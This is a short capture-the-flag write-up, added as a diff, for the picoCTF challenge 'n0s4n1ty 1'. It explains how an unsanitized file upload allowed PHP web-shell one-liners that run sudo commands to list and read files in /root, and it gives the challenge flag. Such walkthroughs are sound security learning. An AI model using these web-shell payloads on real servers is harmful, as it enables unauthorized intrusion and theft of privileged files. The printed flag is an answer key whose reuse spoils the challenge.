@@ -1,0 +1,21 @@
+n0s4n1ty 1 
+
+platform: website
+vulnerability: Unsanitized file uploads
+
+Vulnerability can be exploited by uploading a malicious php file with our payload.
+
+The CTF description said the flag is located in /root directory. 
+
+after checking our permissions: 
+<?php system('sudo -l'); ?> 
+
+I found that we have sudo access on that machine. So i listed the contents of /the root folder
+<?php system('sudo ls /root'); ?> 
+
+found that there is in fact a flag.txt
+<?php system('sudo cat /root/flag.txt'); ?> 
+gave me the flag
+
+flag: picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}
+
